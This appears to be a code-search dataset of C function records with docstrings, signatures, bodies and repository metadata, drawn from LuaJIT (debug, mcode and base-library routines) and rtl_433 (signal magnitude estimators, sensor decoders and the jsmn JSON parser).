{"docstring": "/* lua_getupvalue() and lua_setupvalue() are in lj_api.c. */\n", "func_signal": "LUA_API const char *lua_getlocal(lua_State *L, const lua_Debug *ar, int n)", "code": "{\n  const char *name = NULL;\n  if (ar) {\n    TValue *o = debug_localname(L, ar, &name, (BCReg)n);\n    if (name) {\n      copyTV(L, L->top, o);\n      incr_top(L);\n    }\n  } else if (tvisfunc(L->top-1) && isluafunc(funcV(L->top-1))) {\n    name = debug_varname(funcproto(funcV(L->top-1)), 0, (BCReg)n-1);\n  }\n  return name;\n}", "path": "LuaJIT/src/lj_debug.c", "commit_date": "2020-08-09 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
{"docstring": "/* Abort the reservation. */\n", "func_signal": "void lj_mcode_abort(jit_State *J)", "code": "{\n  if (J->mcarea)\n    mcode_protect(J, MCPROT_RUN);\n}", "path": "LuaJIT/src/lj_mcode.c", "commit_date": "2020-07-01 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
{"docstring": "/* Synchronize data/instruction cache. */\n", "func_signal": "void lj_mcode_sync(void *start, void *end)", "code": "{\n#ifdef LUAJIT_USE_VALGRIND\n  VALGRIND_DISCARD_TRANSLATIONS(start, (char *)end-(char *)start);\n#endif\n#if LJ_TARGET_X86ORX64\n  UNUSED(start); UNUSED(end);\n#elif LJ_TARGET_IOS\n  sys_icache_invalidate(start, (char *)end-(char *)start);\n#elif LJ_TARGET_PPC\n  lj_vm_cachesync(start, end);\n#elif defined(__GNUC__) || defined(__clang__)\n  __clear_cache(start, end);\n#else\n#error \"Missing builtin to flush instruction cache\"\n#endif\n}", "path": "LuaJIT/src/lj_mcode.c", "commit_date": "2020-07-01 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
{"docstring": "/* Put a compact stack dump into a buffer. */\n", "func_signal": "void lj_debug_dumpstack(lua_State *L, SBuf *sb, const char *fmt, int depth)", "code": "{\n  int level = 0, dir = 1, pathstrip = 1;\n  MSize lastlen = 0;\n  if (depth < 0) { level = ~depth; depth = dir = -1; }  /* Reverse frames. */\n  while (level != depth) {  /* Loop through all frame. */\n    int size;\n    cTValue *frame = lj_debug_frame(L, level, &size);\n    if (frame) {\n      cTValue *nextframe = size ? frame+size : NULL;\n      GCfunc *fn = frame_func(frame);\n      const uint8_t *p = (const uint8_t *)fmt;\n      int c;\n      while ((c = *p++)) {\n\tswitch (c) {\n\tcase 'p':  /* Preserve full path. */\n\t  pathstrip = 0;\n\t  break;\n\tcase 'F': case 'f': {  /* Dump function name. */\n\t  const char *name;\n\t  const char *what = lj_debug_funcname(L, frame, &name);\n\t  if (what) {\n\t    if (c == 'F' && isluafunc(fn)) {  /* Dump module:name for 'F'. */\n\t      GCproto *pt = funcproto(fn);\n\t      if (pt->firstline != ~(BCLine)0) {  /* Not a bytecode builtin. */\n\t\tdebug_putchunkname(sb, pt, pathstrip);\n\t\tlj_buf_putb(sb, ':');\n\t      }\n\t    }\n\t    lj_buf_putmem(sb, name, (MSize)strlen(name));\n\t    break;\n\t  }  /* else: can't derive a name, dump module:line. */\n\t  }\n\t  /* fallthrough */\n\tcase 'l':  /* Dump module:line. */\n\t  if (isluafunc(fn)) {\n\t    GCproto *pt = funcproto(fn);\n\t    if (debug_putchunkname(sb, pt, pathstrip)) {\n\t      /* Regular Lua function. */\n\t      BCLine line = c == 'l' ? debug_frameline(L, fn, nextframe) :\n\t\t\t\t       pt->firstline;\n\t      lj_buf_putb(sb, ':');\n\t      lj_strfmt_putint(sb, line >= 0 ? line : pt->firstline);\n\t    }\n\t  } else if (isffunc(fn)) {  /* Dump numbered builtins. */\n\t    lj_buf_putmem(sb, \"[builtin#\", 9);\n\t    lj_strfmt_putint(sb, fn->c.ffid);\n\t    lj_buf_putb(sb, ']');\n\t  } else {  /* Dump C function address. */\n\t    lj_buf_putb(sb, '@');\n\t    lj_strfmt_putptr(sb, fn->c.f);\n\t  }\n\t  break;\n\tcase 'Z':  /* Zap trailing separator. */\n\t  lastlen = sbuflen(sb);\n\t  break;\n\tdefault:\n\t  lj_buf_putb(sb, c);\n\t  break;\n\t}\n      }\n    } else if (dir == 1) {\n      break;\n    } else {\n      level -= size;  /* Reverse frame order: quickly skip missing level. */\n    }\n    level += dir;\n  }\n  if (lastlen)\n    setsbufP(sb, sbufB(sb) + lastlen);  /* Zap trailing separator. */\n}", "path": "LuaJIT/src/lj_debug.c", "commit_date": "2020-08-09 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
{"docstring": "/* Get name of local variable from 1-based slot number and function/frame. */\n", "func_signal": "static TValue *debug_localname(lua_State *L, const lua_Debug *ar,\n\t\t\t       const char **name, BCReg slot1)", "code": "{\n  uint32_t offset = (uint32_t)ar->i_ci & 0xffff;\n  uint32_t size = (uint32_t)ar->i_ci >> 16;\n  TValue *frame = tvref(L->stack) + offset;\n  TValue *nextframe = size ? frame + size : NULL;\n  GCfunc *fn = frame_func(frame);\n  BCPos pc = debug_framepc(L, fn, nextframe);\n  if (!nextframe) nextframe = L->top+LJ_FR2;\n  if ((int)slot1 < 0) {  /* Negative slot number is for varargs. */\n    if (pc != NO_BCPOS) {\n      GCproto *pt = funcproto(fn);\n      if ((pt->flags & PROTO_VARARG)) {\n\tslot1 = pt->numparams + (BCReg)(-(int)slot1);\n\tif (frame_isvarg(frame)) {  /* Vararg frame has been set up? (pc!=0) */\n\t  nextframe = frame;\n\t  frame = frame_prevd(frame);\n\t}\n\tif (frame + slot1+LJ_FR2 < nextframe) {\n\t  *name = \"(*vararg)\";\n\t  return frame+slot1;\n\t}\n      }\n    }\n    return NULL;\n  }\n  if (pc != NO_BCPOS &&\n      (*name = debug_varname(funcproto(fn), pc, slot1-1)) != NULL)\n    ;\n  else if (slot1 > 0 && frame + slot1+LJ_FR2 < nextframe)\n    *name = \"(*temporary)\";\n  return frame+slot1;\n}", "path": "LuaJIT/src/lj_debug.c", "commit_date": "2020-08-09 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
{"docstring": "/* Get name and value of upvalue. */\n", "func_signal": "const char *lj_debug_uvnamev(cTValue *o, uint32_t idx, TValue **tvp, GCobj **op)", "code": "{\n  if (tvisfunc(o)) {\n    GCfunc *fn = funcV(o);\n    if (isluafunc(fn)) {\n      GCproto *pt = funcproto(fn);\n      if (idx < pt->sizeuv) {\n\tGCobj *uvo = gcref(fn->l.uvptr[idx]);\n\t*tvp = uvval(&uvo->uv);\n\t*op = uvo;\n\treturn lj_debug_uvname(pt, idx);\n      }\n    } else {\n      if (idx < fn->c.nupvalues) {\n\t*tvp = &fn->c.upvalue[idx];\n\t*op = obj2gco(fn);\n\treturn \"\";\n      }\n    }\n  }\n  return NULL;\n}", "path": "LuaJIT/src/lj_debug.c", "commit_date": "2020-08-09 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
{"docstring": "/* -- Base library: conversions ------------------------------------------- */\n", "func_signal": "LJLIB_ASM(tonumber)\t\tLJLIB_REC(.)", "code": "{\n  int32_t base = lj_lib_optint(L, 2, 10);\n  if (base == 10) {\n    TValue *o = lj_lib_checkany(L, 1);\n    if (lj_strscan_numberobj(o)) {\n      copyTV(L, L->base-1-LJ_FR2, o);\n      return FFH_RES(1);\n    }\n#if LJ_HASFFI\n    if (tviscdata(o)) {\n      CTState *cts = ctype_cts(L);\n      CType *ct = lj_ctype_rawref(cts, cdataV(o)->ctypeid);\n      if (ctype_isenum(ct->info)) ct = ctype_child(cts, ct);\n      if (ctype_isnum(ct->info) || ctype_iscomplex(ct->info)) {\n\tif (LJ_DUALNUM && ctype_isinteger_or_bool(ct->info) &&\n\t    ct->size <= 4 && !(ct->size == 4 && (ct->info & CTF_UNSIGNED))) {\n\t  int32_t i;\n\t  lj_cconv_ct_tv(cts, ctype_get(cts, CTID_INT32), (uint8_t *)&i, o, 0);\n\t  setintV(L->base-1-LJ_FR2, i);\n\t  return FFH_RES(1);\n\t}\n\tlj_cconv_ct_tv(cts, ctype_get(cts, CTID_DOUBLE),\n\t\t       (uint8_t *)&(L->base-1-LJ_FR2)->n, o, 0);\n\treturn FFH_RES(1);\n      }\n    }\n#endif\n  } else {\n    const char *p = strdata(lj_lib_checkstr(L, 1));\n    char *ep;\n    unsigned int neg = 0;\n    unsigned long ul;\n    if (base < 2 || base > 36)\n      lj_err_arg(L, 2, LJ_ERR_BASERNG);\n    while (lj_char_isspace((unsigned char)(*p))) p++;\n    if (*p == '-') { p++; neg = 1; } else if (*p == '+') { p++; }\n    if (lj_char_isalnum((unsigned char)(*p))) {\n      ul = strtoul(p, &ep, base);\n      if (p != ep) {\n\twhile (lj_char_isspace((unsigned char)(*ep))) ep++;\n\tif (*ep == '\\0') {\n\t  if (LJ_DUALNUM && LJ_LIKELY(ul < 0x80000000u+neg)) {\n\t    if (neg) ul = (unsigned long)-(long)ul;\n\t    setintV(L->base-1-LJ_FR2, (int32_t)ul);\n\t  } else {\n\t    lua_Number n = (lua_Number)ul;\n\t    if (neg) n = -n;\n\t    setnumV(L->base-1-LJ_FR2, n);\n\t  }\n\t  return FFH_RES(1);\n\t}\n      }\n    }\n  }\n  setnilV(L->base-1-LJ_FR2);\n  return FFH_RES(1);\n}", "path": "LuaJIT/src/lib_base.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
{"docstring": "/* Upvalue holds weak table. */\n", "func_signal": "LJLIB_CF(newproxy)", "code": "{\n  lua_settop(L, 1);\n  lua_newuserdata(L, 0);\n  if (lua_toboolean(L, 1) == 0) {  /* newproxy(): without metatable. */\n    return 1;\n  } else if (lua_isboolean(L, 1)) {  /* newproxy(true): with metatable. */\n    lua_newtable(L);\n    lua_pushvalue(L, -1);\n    lua_pushboolean(L, 1);\n    lua_rawset(L, lua_upvalueindex(1));  /* Remember mt in weak table. */\n  } else {  /* newproxy(proxy): inherit metatable. */\n    int validproxy = 0;\n    if (lua_getmetatable(L, 1)) {\n      lua_rawget(L, lua_upvalueindex(1));\n      validproxy = lua_toboolean(L, -1);\n      lua_pop(L, 1);\n    }\n    if (!validproxy)\n      lj_err_arg(L, 1, LJ_ERR_NOPROXY);\n    lua_getmetatable(L, 1);\n  }\n  lua_setmetatable(L, 2);\n  return 1;\n}", "path": "LuaJIT/src/lib_base.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
{"docstring": "/* Free all MCode areas. */\n", "func_signal": "void lj_mcode_free(jit_State *J)", "code": "{\n  MCode *mc = J->mcarea;\n  J->mcarea = NULL;\n  J->szallmcarea = 0;\n  while (mc) {\n    MCode *next = ((MCLink *)mc)->next;\n    mcode_free(J, mc, ((MCLink *)mc)->size);\n    mc = next;\n  }\n}", "path": "LuaJIT/src/lj_mcode.c", "commit_date": "2020-07-01 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
{"docstring": "/* Recycle the lj_lib_checkany(L, 1) from assert. */\n", "func_signal": "LJLIB_ASM(setmetatable)\t\tLJLIB_REC(.)", "code": "{\n  GCtab *t = lj_lib_checktab(L, 1);\n  GCtab *mt = lj_lib_checktabornil(L, 2);\n  if (!tvisnil(lj_meta_lookup(L, L->base, MM_metatable)))\n    lj_err_caller(L, LJ_ERR_PROTMT);\n  setgcref(t->metatable, obj2gco(mt));\n  if (mt) { lj_gc_objbarriert(L, t, mt); }\n  settabV(L, L->base-1-LJ_FR2, t);\n  return FFH_RES(1);\n}", "path": "LuaJIT/src/lib_base.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
{"docstring": "/* -- Base library: throw and catch errors -------------------------------- */\n", "func_signal": "LJLIB_CF(error)", "code": "{\n  int32_t level = lj_lib_optint(L, 2, 1);\n  lua_settop(L, 1);\n  if (lua_isstring(L, 1) && level > 0) {\n    luaL_where(L, level);\n    lua_pushvalue(L, 1);\n    lua_concat(L, 2);\n  }\n  return lua_error(L);\n}", "path": "LuaJIT/src/lib_base.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
{"docstring": "/* Get line number for a bytecode position. */\n", "func_signal": "BCLine LJ_FASTCALL lj_debug_line(GCproto *pt, BCPos pc)", "code": "{\n  const void *lineinfo = proto_lineinfo(pt);\n  if (pc <= pt->sizebc && lineinfo) {\n    BCLine first = pt->firstline;\n    if (pc == pt->sizebc) return first + pt->numline;\n    if (pc-- == 0) return first;\n    if (pt->numline < 256)\n      return first + (BCLine)((const uint8_t *)lineinfo)[pc];\n    else if (pt->numline < 65536)\n      return first + (BCLine)((const uint16_t *)lineinfo)[pc];\n    else\n      return first + (BCLine)((const uint32_t *)lineinfo)[pc];\n  }\n  return 0;\n}", "path": "LuaJIT/src/lj_debug.c", "commit_date": "2020-08-09 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
{"docstring": "/* Allocate a new MCode area. */\n", "func_signal": "static void mcode_allocarea(jit_State *J)", "code": "{\n  MCode *oldarea = J->mcarea;\n  size_t sz = (size_t)J->param[JIT_P_sizemcode] << 10;\n  sz = (sz + LJ_PAGESIZE-1) & ~(size_t)(LJ_PAGESIZE - 1);\n  J->mcarea = (MCode *)mcode_alloc(J, sz);\n  J->szmcarea = sz;\n  J->mcprot = MCPROT_GEN;\n  J->mctop = (MCode *)((char *)J->mcarea + J->szmcarea);\n  J->mcbot = (MCode *)((char *)J->mcarea + sizeof(MCLink));\n  ((MCLink *)J->mcarea)->next = oldarea;\n  ((MCLink *)J->mcarea)->size = sz;\n  J->szallmcarea += sz;\n}", "path": "LuaJIT/src/lj_mcode.c", "commit_date": "2020-07-01 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
{"docstring": "/* Push location string for a bytecode position to Lua stack. */\n", "func_signal": "void lj_debug_pushloc(lua_State *L, GCproto *pt, BCPos pc)", "code": "{\n  GCstr *name = proto_chunkname(pt);\n  const char *s = strdata(name);\n  MSize i, len = name->len;\n  BCLine line = lj_debug_line(pt, pc);\n  if (pt->firstline == ~(BCLine)0) {\n    lj_strfmt_pushf(L, \"builtin:%s\", s);\n  } else if (*s == '@') {\n    s++; len--;\n    for (i = len; i > 0; i--)\n      if (s[i] == '/' || s[i] == '\\\\') {\n\ts += i+1;\n\tbreak;\n      }\n    lj_strfmt_pushf(L, \"%s:%d\", s, line);\n  } else if (len > 40) {\n    lj_strfmt_pushf(L, \"%p:%d\", pt, line);\n  } else if (*s == '=') {\n    lj_strfmt_pushf(L, \"%s:%d\", s+1, line);\n  } else {\n    lj_strfmt_pushf(L, \"\\\"%s\\\":%d\", s, line);\n  }\n}", "path": "LuaJIT/src/lj_debug.c", "commit_date": "2020-08-09 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
{"docstring": "/* Generate shortened source name. */\n", "func_signal": "void lj_debug_shortname(char *out, GCstr *str, BCLine line)", "code": "{\n  const char *src = strdata(str);\n  if (*src == '=') {\n    strncpy(out, src+1, LUA_IDSIZE);  /* Remove first char. */\n    out[LUA_IDSIZE-1] = '\\0';  /* Ensures null termination. */\n  } else if (*src == '@') {  /* Output \"source\", or \"...source\". */\n    size_t len = str->len-1;\n    src++;  /* Skip the `@' */\n    if (len >= LUA_IDSIZE) {\n      src += len-(LUA_IDSIZE-4);  /* Get last part of file name. */\n      *out++ = '.'; *out++ = '.'; *out++ = '.';\n    }\n    strcpy(out, src);\n  } else {  /* Output [string \"string\"] or [builtin:name]. */\n    size_t len;  /* Length, up to first control char. */\n    for (len = 0; len < LUA_IDSIZE-12; len++)\n      if (((const unsigned char *)src)[len] < ' ') break;\n    strcpy(out, line == ~(BCLine)0 ? \"[builtin:\" : \"[string \\\"\"); out += 9;\n    if (src[len] != '\\0') {  /* Must truncate? */\n      if (len > LUA_IDSIZE-15) len = LUA_IDSIZE-15;\n      strncpy(out, src, len); out += len;\n      strcpy(out, \"...\"); out += 3;\n    } else {\n      strcpy(out, src); out += len;\n    }\n    strcpy(out, line == ~(BCLine)0 ? \"]\" : \"\\\"]\");\n  }\n}", "path": "LuaJIT/src/lj_debug.c", "commit_date": "2020-08-09 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
{"docstring": "/* Set/reset protection to allow patching of MCode areas. */\n", "func_signal": "MCode *lj_mcode_patch(jit_State *J, MCode *ptr, int finish)", "code": "{\n#if LUAJIT_SECURITY_MCODE == 0\n  UNUSED(J); UNUSED(ptr); UNUSED(finish);\n  return NULL;\n#else\n  if (finish) {\n    if (J->mcarea == ptr)\n      mcode_protect(J, MCPROT_RUN);\n    else if (LJ_UNLIKELY(mcode_setprot(ptr, ((MCLink *)ptr)->size, MCPROT_RUN)))\n      mcode_protfail(J);\n    return NULL;\n  } else {\n    MCode *mc = J->mcarea;\n    /* Try current area first to use the protection cache. */\n    if (ptr >= mc && ptr < (MCode *)((char *)mc + J->szmcarea)) {\n      mcode_protect(J, MCPROT_GEN);\n      return mc;\n    }\n    /* Otherwise search through the list of MCode areas. */\n    for (;;) {\n      mc = ((MCLink *)mc)->next;\n      lj_assertJ(mc != NULL, \"broken MCode area chain\");\n      if (ptr >= mc && ptr < (MCode *)((char *)mc + ((MCLink *)mc)->size)) {\n\tif (LJ_UNLIKELY(mcode_setprot(mc, ((MCLink *)mc)->size, MCPROT_GEN)))\n\t  mcode_protfail(J);\n\treturn mc;\n      }\n    }\n  }\n#endif\n}", "path": "LuaJIT/src/lj_mcode.c", "commit_date": "2020-07-01 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
{"docstring": "/* Deduce function name from caller of a frame. */\n", "func_signal": "const char *lj_debug_funcname(lua_State *L, cTValue *frame, const char **name)", "code": "{\n  cTValue *pframe;\n  GCfunc *fn;\n  BCPos pc;\n  if (frame <= tvref(L->stack)+LJ_FR2)\n    return NULL;\n  if (frame_isvarg(frame))\n    frame = frame_prevd(frame);\n  pframe = frame_prev(frame);\n  fn = frame_func(pframe);\n  pc = debug_framepc(L, fn, frame);\n  if (pc != NO_BCPOS) {\n    GCproto *pt = funcproto(fn);\n    const BCIns *ip = &proto_bc(pt)[check_exp(pc < pt->sizebc, pc)];\n    MMS mm = bcmode_mm(bc_op(*ip));\n    if (mm == MM_call) {\n      BCReg slot = bc_a(*ip);\n      if (bc_op(*ip) == BC_ITERC) slot -= 3;\n      return lj_debug_slotname(pt, ip, slot, name);\n    } else if (mm != MM__MAX) {\n      *name = strdata(mmname_str(G(L), mm));\n      return \"metamethod\";\n    }\n  }\n  return NULL;\n}", "path": "LuaJIT/src/lj_debug.c", "commit_date": "2020-08-09 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
{"docstring": "/* Put the chunkname into a buffer. */\n", "func_signal": "static int debug_putchunkname(SBuf *sb, GCproto *pt, int pathstrip)", "code": "{\n  GCstr *name = proto_chunkname(pt);\n  const char *p = strdata(name);\n  if (pt->firstline == ~(BCLine)0) {\n    lj_buf_putmem(sb, \"[builtin:\", 9);\n    lj_buf_putstr(sb, name);\n    lj_buf_putb(sb, ']');\n    return 0;\n  }\n  if (*p == '=' || *p == '@') {\n    MSize len = name->len-1;\n    p++;\n    if (pathstrip) {\n      int i;\n      for (i = len-1; i >= 0; i--)\n\tif (p[i] == '/' || p[i] == '\\\\') {\n\t  len -= i+1;\n\t  p = p+i+1;\n\t  break;\n\t}\n    }\n    lj_buf_putmem(sb, p, len);\n  } else {\n    lj_buf_putmem(sb, \"[string]\", 8);\n  }\n  return 1;\n}", "path": "LuaJIT/src/lj_debug.c", "commit_date": "2020-08-09 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
{"docstring": "/* Protection twiddling failed. Probably due to kernel security. */\n", "func_signal": "static LJ_NOINLINE void mcode_protfail(jit_State *J)", "code": "{\n  lua_CFunction panic = J2G(J)->panic;\n  if (panic) {\n    lua_State *L = J->L;\n    setstrV(L, L->top++, lj_err_str(L, LJ_ERR_JITPROT));\n    panic(L);\n  }\n}", "path": "LuaJIT/src/lj_mcode.c", "commit_date": "2020-07-01 00:00:00", "repo_name": "LuaJIT/LuaJIT", "stars": 4300, "license": "other", "language": "c", "size": 8707}
{"docstring": "/// 122/128, 51/128 Magnitude Estimator for CS16 (SIMD has min/max).\n", "func_signal": "void magnitude_est_cs16(int16_t const *iq_buf, uint16_t *y_buf, uint32_t len)", "code": "{\n    unsigned long i;\n    for (i = 0; i < len; i++) {\n        uint32_t x = abs(iq_buf[2 * i]);\n        uint32_t y = abs(iq_buf[2 * i + 1]);\n        uint32_t mi = x < y ? x : y;\n        uint32_t mx = x > y ? x : y;\n        uint32_t mag_est = 122 * mx + 51 * mi;\n        y_buf[i] = mag_est >> 8; // max 5668864, scaled 22144, fs 16384\n    }\n}", "path": "rtl_433/src/baseband.c", "commit_date": "2020-11-03 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
{"docstring": "/** @sa gt_wt_02_process_row() */\n", "func_signal": "static int gt_wt_02_decode(r_device *decoder, bitbuffer_t *bitbuffer)", "code": "{\n    int counter = 0;\n    // iterate through all rows, return on first successful\n    for (int row = 0; row < bitbuffer->num_rows && !counter; ++row)\n        counter += gt_wt_02_process_row(decoder, bitbuffer, row);\n    return counter;\n}", "path": "rtl_433/src/devices/gt_wt_02.c", "commit_date": "2020-02-03 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
{"docstring": "/// True Magnitude for CS16 (sqrt can SIMD but float is slow).\n", "func_signal": "void magnitude_true_cs16(int16_t const *iq_buf, uint16_t *y_buf, uint32_t len)", "code": "{\n    unsigned long i;\n    for (i = 0; i < len; i++) {\n        int32_t x = iq_buf[2 * i];\n        int32_t y = iq_buf[2 * i + 1];\n        y_buf[i]  = (int)sqrt(x * x + y * y) >> 1; // max 46341, scaled 23170, fs 16384\n    }\n}", "path": "rtl_433/src/baseband.c", "commit_date": "2020-11-03 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
{"docstring": "/** @sa tpms_abarth124_decode() */\n", "func_signal": "static int tpms_abarth124_callback(r_device *decoder, bitbuffer_t *bitbuffer)", "code": "{\n    // preamble\n    uint8_t const preamble_pattern[3] = {0xaa, 0xaa, 0xa9}; // after invert\n\n    unsigned bitpos = 0;\n    int events      = 0;\n\n    bitbuffer_invert(bitbuffer);\n    // Find a preamble with enough bits after it that it could be a complete packet\n    while ((bitpos = bitbuffer_search(bitbuffer, 0, bitpos, preamble_pattern, 24)) + 80 <=\n            bitbuffer->bits_per_row[0]) {\n        events += tpms_abarth124_decode(decoder, bitbuffer, 0, bitpos + 24);\n        bitpos += 2;\n    }\n\n    return events;\n}", "path": "rtl_433/src/devices/tpms_abarth124.c", "commit_date": "2020-11-03 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
{"docstring": "/**\n * Fills token type and boundaries.\n */\n", "func_signal": "static void jsmn_fill_token(jsmntok_t *token, jsmntype_t type,\n                            int start, int end)", "code": "{\n\ttoken->type = type;\n\ttoken->start = start;\n\ttoken->end = end;\n\ttoken->size = 0;\n}", "path": "rtl_433/src/jsmn.c", "commit_date": "2020-11-10 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
{"docstring": "/** Integer implementation of atan2() with int16_t normalized output.\n\n    Returns arc tangent of y/x across all quadrants in radians.\n    Error max 0.07 radians.\n    Reference: http://dspguru.com/dsp/tricks/fixed-point-atan2-with-self-normalization\n    @param y Numerator (imaginary value of complex vector)\n    @param x Denominator (real value of complex vector)\n    @return angle in radians (Pi equals INT16_MAX)\n*/\n", "func_signal": "static int16_t atan2_int16(int32_t y, int32_t x)", "code": "{\n    static int32_t const I_PI_4 = INT16_MAX/4;      // M_PI/4\n    static int32_t const I_3_PI_4 = 3*INT16_MAX/4;  // 3*M_PI/4\n\n    int32_t const abs_y = abs(y);\n    int32_t angle;\n\n    if (!x && !y) return 0; // We would get 8191 with the code below\n\n    if (x >= 0) {    // Quadrant I and IV\n        int32_t denom = (abs_y + x);\n        if (denom == 0) denom = 1;  // Prevent divide by zero\n        angle = I_PI_4 - I_PI_4 * (x - abs_y) / denom;\n    } else {        // Quadrant II and III\n        int32_t denom = (abs_y - x);\n        if (denom == 0) denom = 1;  // Prevent divide by zero\n        angle = I_3_PI_4 - I_PI_4 * (x + abs_y) / denom;\n    }\n    if (y < 0) angle = -angle;    // Negate if in III or IV\n    return angle;\n}", "path": "rtl_433/src/baseband.c", "commit_date": "2020-11-03 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
{"docstring": "/// Set a single bit in a bitrow at bit_idx position.  Assume success, no bounds checking, so be careful!\n/// Maybe this can graduate to bitbuffer.c someday?\n", "func_signal": "void bitrow_set_bit(bitrow_t bitrow, unsigned bit_idx, unsigned bit_val)", "code": "{\n    if (bit_val == 0) {\n        bitrow[bit_idx >> 3] &= ~(1 << (7 - (bit_idx & 7)));\n    }\n    else {\n        bitrow[bit_idx >> 3] |= (1 << (7 - (bit_idx & 7)));\n    }\n}", "path": "rtl_433/src/devices/directv.c", "commit_date": "2020-08-05 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
{"docstring": "// This will give a noisy envelope of OOK/ASK signals.\n// Subtract the bias (-128) and get an envelope estimation.\n", "func_signal": "void envelope_detect(uint8_t const *iq_buf, uint16_t *y_buf, uint32_t len)", "code": "{\n    unsigned long i;\n    for (i = 0; i < len; i++) {\n        y_buf[i] = scaled_squares[iq_buf[2 * i ]] + scaled_squares[iq_buf[2 * i + 1]];\n    }\n}", "path": "rtl_433/src/baseband.c", "commit_date": "2020-11-03 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
{"docstring": "/**\n * Fills next token with JSON string.\n */\n", "func_signal": "static int jsmn_parse_string(jsmn_parser *parser, const char *js,\n\t\tsize_t len, jsmntok_t *tokens, size_t num_tokens)", "code": "{\n\tjsmntok_t *token;\n\n\tint start = parser->pos;\n\n\tparser->pos++;\n\n\t/* Skip starting quote */\n\tfor (; parser->pos < len && js[parser->pos] != '\\0'; parser->pos++) {\n\t\tchar c = js[parser->pos];\n\n\t\t/* Quote: end of string */\n\t\tif (c == '\\\"') {\n\t\t\tif (tokens == NULL) {\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\ttoken = jsmn_alloc_token(parser, tokens, num_tokens);\n\t\t\tif (token == NULL) {\n\t\t\t\tparser->pos = start;\n\t\t\t\treturn JSMN_ERROR_NOMEM;\n\t\t\t}\n\t\t\tjsmn_fill_token(token, JSMN_STRING, start+1, parser->pos);\n#ifdef JSMN_PARENT_LINKS\n\t\t\ttoken->parent = parser->toksuper;\n#endif\n\t\t\treturn 0;\n\t\t}\n\n\t\t/* Backslash: Quoted symbol expected */\n\t\tif (c == '\\\\' && parser->pos + 1 < len) {\n\t\t\tint i;\n\t\t\tparser->pos++;\n\t\t\tswitch (js[parser->pos]) {\n\t\t\t\t/* Allowed escaped symbols */\n\t\t\t\tcase '\\\"': case '/' : case '\\\\' : case 'b' :\n\t\t\t\tcase 'f' : case 'r' : case 'n'  : case 't' :\n\t\t\t\t\tbreak;\n\t\t\t\t/* Allows escaped symbol \\uXXXX */\n\t\t\t\tcase 'u':\n\t\t\t\t\tparser->pos++;\n\t\t\t\t\tfor(i = 0; i < 4 && parser->pos < len && js[parser->pos] != '\\0'; i++) {\n\t\t\t\t\t\t/* If it isn't a hex character we have an error */\n\t\t\t\t\t\tif(!((js[parser->pos] >= 48 && js[parser->pos] <= 57) || /* 0-9 */\n\t\t\t\t\t\t\t\t\t(js[parser->pos] >= 65 && js[parser->pos] <= 70) || /* A-F */\n\t\t\t\t\t\t\t\t\t(js[parser->pos] >= 97 && js[parser->pos] <= 102))) { /* a-f */\n\t\t\t\t\t\t\tparser->pos = start;\n\t\t\t\t\t\t\treturn JSMN_ERROR_INVAL;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tparser->pos++;\n\t\t\t\t\t}\n\t\t\t\t\tparser->pos--;\n\t\t\t\t\tbreak;\n\t\t\t\t/* Unexpected symbol */\n\t\t\t\tdefault:\n\t\t\t\t\tparser->pos = start;\n\t\t\t\t\treturn JSMN_ERROR_INVAL;\n\t\t\t}\n\t\t}\n\t}\n\tparser->pos = start;\n\treturn JSMN_ERROR_PART;\n}", "path": "rtl_433/src/jsmn.c", "commit_date": "2020-11-10 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
